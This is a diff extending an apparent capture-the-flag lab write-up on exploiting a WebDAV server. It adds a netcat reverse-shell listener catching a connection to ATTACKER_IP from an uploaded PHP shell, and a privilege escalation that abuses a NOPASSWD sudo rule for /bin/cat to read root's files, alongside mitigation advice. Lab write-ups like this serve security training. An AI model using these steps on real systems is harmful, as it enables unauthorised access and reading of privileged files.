@@ -83,15 +83,67 @@ Progress: [=============================>] 100.0% of 5494 bytes succeeded.
 
 The shell is now accessible at: `http://MACHINE_IP/webdav/shell.php`
 
+Accessing the shell via netcat listener:
+
+```bash
+nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [ATTACKER_IP] from (UNKNOWN) [10.112.158.31] 60888
+```
+
+---
+
+## Privilege Escalation
+
+### Initial Shell Access
+Connected to the target as `www-data` user:
+
+```bash
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+### Checking Sudo Privileges
+Checked available sudo commands:
+
+```bash
+$ sudo -l
+Matching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/usr/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /bin/cat
+```
+
+The `www-data` user can run `/bin/cat` as root without a password!
+
+### Finding the User Flag
+Located the user flag in the home directory:
+
+```bash
+$ cd /home/merlin
+$ ls
+user.txt
+$ cat user.txt
+||USER_FLAG||
+```
+
+### Finding the Root Flag
+Leveraged the `/bin/cat` sudo privilege to read the root flag:
+
+```bash
+$ sudo /bin/cat /root/root.txt
+||ROOT_FLAG||
+```
+
 ---
 
 ## Flags
 
 ### Flag 1: User Flag
-> ||THM{user_flag}||
+> ||USER_FLAG||
 
 ### Flag 2: Root Flag  
-> ||THM{root_flag}||
+> ||ROOT_FLAG||
 
 ---
 
@@ -101,7 +153,8 @@ The shell is now accessible at: `http://MACHINE_IP/webdav/shell.php`
 2. **Weak Credentials**: Credentials were accepted for access
 3. **File Upload Vulnerability**: WebDAV allowed uploading executable PHP files
 4. **Remote Code Execution**: Uploaded PHP shell provides shell access to the system
-5. **Importance of Enumeration**: Directory scanning revealed the vulnerable `/webdav` endpoint
+5. **Sudo Misconfiguration**: Excessive sudo privileges allowed privilege escalation
+6. **Importance of Enumeration**: Directory scanning revealed the vulnerable `/webdav` endpoint
 
 ---
 
@@ -112,6 +165,8 @@ The shell is now accessible at: `http://MACHINE_IP/webdav/shell.php`
 - Implement proper access controls and authentication
 - Restrict file upload types
 - Monitor WebDAV access logs
+- **Principle of Least Privilege**: Limit sudo access to only necessary commands
+- Use `sudo` with specific command restrictions and arguments
 
 ---
 
@@ -119,6 +174,7 @@ The shell is now accessible at: `http://MACHINE_IP/webdav/shell.php`
 - `nmap` - Network reconnaissance
 - `gobuster` - Directory enumeration  
 - `cadaver` - WebDAV client
+- `nc` (netcat) - Reverse shell listener
 
 ---
 
